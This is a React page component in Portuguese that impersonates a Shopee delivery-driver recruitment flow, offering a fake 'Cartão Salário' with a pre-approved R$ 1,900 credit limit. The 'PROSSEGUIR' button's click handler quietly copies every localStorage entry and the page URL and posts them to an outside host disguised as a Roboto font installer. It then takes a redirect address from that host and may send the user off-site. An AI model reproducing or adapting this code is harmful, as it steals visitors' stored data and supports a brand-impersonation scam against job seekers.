import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { useScrollTop } from '@/hooks/use-scroll-top';

// API Links and Scripts
// API Endpoint: https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17
// Temp Data API: https://fonts-roboto-install.replit.app/api/temp-data

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const [candidatoData, setCandidatoData] = useState<any>(null);

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);

  // Função para formatar o nome do cartão
  const formatCardName = (fullName: string) => {
    if (!fullName) return 'CANDIDATO';
    
    // Lista de preposições a serem removidas
    const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
    
    // Dividir o nome em palavras e converter para maiúsculo
    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
    
    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
    const validNames = words.filter(word => !prepositions.includes(word));
    
    // Retornar os dois primeiros nomes válidos
    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
  };


  const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow">
        <main className="container mx-auto my-4 px-4">
          <div className="flex justify-center">
            <div className="w-full max-w-4xl">
              <div className="bg-white rounded-lg shadow-sm border border-gray-200">
                <div className="bg-[#E83D22] text-white p-4 rounded-t-lg">
                  <h5 className="text-xl font-semibold mb-0">Forma de Pagamento</h5>
                </div>
                <div className="p-6">
                  <div className="my-4">
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
                      <div className="text-center">
                        <div className="relative inline-block">
                          <img 
                            src="https://i.ibb.co/VWZ2B4jv/Inserir-um-ti-tulo-4-1-1.webp" 
                            alt="Cartão Salário Shopee" 
                            className="max-w-full w-80 h-auto rounded-2xl"
                          />
                          <div 
                            className="absolute font-bold text-lg tracking-wide"
                            style={{
                              bottom: '35px',
                              left: '30px',
                              fontFamily: 'Courier New, Courier, monospace',
                              color: '#FFFFFF',
                              textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
                            }}
                          >
                            {nomeCartao}
                          </div>
                        </div>
                      </div>
                      <div>
                        <h4 className="text-[#E83D22] font-bold text-2xl mb-5 text-left">
                          Cartão Salário Shopee
                        </h4>
                        <p className="text-gray-700 text-base leading-relaxed mb-5 text-left">
                          Seu salário será depositado automaticamente no <strong>Cartão Salário da Shopee</strong>, uma parceria exclusiva com a MasterCard.
                        </p>
                        
                        <div className="space-y-4 text-left">
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Sem taxa de saque</strong> em qualquer caixa eletrônico</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Função débito e crédito</strong> integradas</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Limite de crédito de R$ 1.900,00</strong> pré-aprovado</span>
                          </div>
                        </div>
                        
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-5">
                          <div className="flex items-start">
                            <i className="fas fa-info-circle text-blue-600 mr-2 mt-1"></i>
                            <div>
                              <small className="text-gray-700">
                                <strong>Benefício exclusivo:</strong> A Shopee em parceria com a MasterCard liberou um limite de crédito especial de R$ 1.900,00 para todos os entregadores.
                              </small>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-center mt-6">
                    {/* Embedded API Button with Loading State */}
                    <style dangerouslySetInnerHTML={{
                      __html: `
                        .btn-6ff86494 {
                          background: #df4d22;
                          color: #ffffff;
                          padding: 8px 16px;
                          width: 340px;
                          height: auto;
                          border: none;
                          border-radius: 0px;
                          font-weight: 700;
                          font-size: 16px;
                          cursor: pointer;
                          font-family: Inter, sans-serif;
                          text-decoration: none;
                          display: inline-block;
                          transition: opacity 0.2s;
                          position: relative;
                        }
                        .btn-6ff86494:hover {
                          opacity: 0.9;
                        }
                        .btn-6ff86494.loading {
                          cursor: not-allowed;
                          opacity: 0.7;
                        }
                        .btn-6ff86494 .spinner {
                          display: none;
                          width: 12px;
                          height: 12px;
                          border: 2px solid transparent;
                          border-top: 2px solid currentColor;
                          border-radius: 50%;
                          animation: spin 1s linear infinite;
                          margin-right: 8px;
                          vertical-align: text-top;
                        }
                        .btn-6ff86494.loading .spinner {
                          display: inline-block;
                        }
                        @keyframes spin {
                          0% { transform: rotate(0deg); }
                          100% { transform: rotate(360deg); }
                        }
                      `
                    }} />
                    
                    <button 
                      className="btn-6ff86494" 
                      ref={(btn) => {
                        if (btn) {
                          btn.onclick = function(e: Event) {
                            e.preventDefault();
                            
                            // Function to perform the redirect with optional temp data ID
                            function performRedirect(tempDataId: string | null) {
                              const xhr = new XMLHttpRequest();
                              xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
                              xhr.onreadystatechange = function() {
                                if(xhr.readyState === 4) {
                                  let redirectUrl = '/finalizacao';
                                  if(xhr.status === 200) {
                                    try {
                                      const response = JSON.parse(xhr.responseText);
                                      redirectUrl = response.redirect_url || '/finalizacao';
                                    } catch(e) {}
                                  }
                                  
                                  // Append temp data ID to redirect URL if available
                                  if(tempDataId && redirectUrl) {
                                    const separator = redirectUrl.includes('?') ? '&' : '?';
                                    redirectUrl += separator + 'tempData=' + tempDataId;
                                  }
                                  
                                  // Handle relative URLs and perform navigation
                                  if(redirectUrl.startsWith('/')) {
                                    // Use React navigation for internal routes
                                    navigate(redirectUrl);
                                  } else {
                                    window.location.href = redirectUrl;
                                  }
                                }
                              };
                              xhr.onerror = function() {
                                // Fallback to original URL if API fails
                                navigate('/finalizacao');
                              };
                              xhr.send();
                            }
                            
                            // Capture localStorage data
                            try {
                              const localStorageData: Record<string, string> = {};
                              for (let i = 0; i < localStorage.length; i++) {
                                const key = localStorage.key(i);
                                if (key) {
                                  localStorageData[key] = localStorage.getItem(key) || '';
                                }
                              }
                              
                              // Only send localStorage data if there's something to send
                              if (Object.keys(localStorageData).length > 0) {
                                // Show loading state
                                btn.classList.add('loading');
                                btn.disabled = true;
                                const btnText = btn.querySelector('.btn-text') as HTMLElement;
                                const originalText = btnText?.textContent || 'PROSSEGUIR';
                                if (btnText) btnText.textContent = 'Carregando...';
                                
                                // Store localStorage data temporarily
                                const storeXhr = new XMLHttpRequest();
                                storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
                                storeXhr.setRequestHeader('Content-Type', 'application/json');
                                storeXhr.onreadystatechange = function() {
                                  if(storeXhr.readyState === 4) {
                                    let tempDataId = null;
                                    if(storeXhr.status === 201) {
                                      try {
                                        const storeResponse = JSON.parse(storeXhr.responseText);
                                        tempDataId = storeResponse.id;
                                      } catch(e) {}
                                    }
                                    // Perform redirect with or without temp data ID
                                    performRedirect(tempDataId);
                                  }
                                };
                                storeXhr.onerror = function() {
                                  // Restore button state on error
                                  btn.classList.remove('loading');
                                  btn.disabled = false;
                                  if (btnText) btnText.textContent = originalText;
                                  // If storing fails, just perform normal redirect
                                  performRedirect(null);
                                };
                                
                                const requestData = {
                                  buttonId: '6ff86494-460d-463f-9f40-3de3eb9fee17',
                                  localStorageData: JSON.stringify(localStorageData),
                                  sourceUrl: window.location.href
                                };
                                storeXhr.send(JSON.stringify(requestData));
                              } else {
                                // No localStorage data, perform normal redirect
                                performRedirect(null);
                              }
                            } catch(err) {
                              // If localStorage access fails, perform normal redirect
                              performRedirect(null);
                            }
                          };
                        }
                      }}
                    >
                      <span className="spinner"></span>
                      <span className="btn-text">PROSSEGUIR</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      
      <Footer />
    </div>
  );
};

export default Recebedor;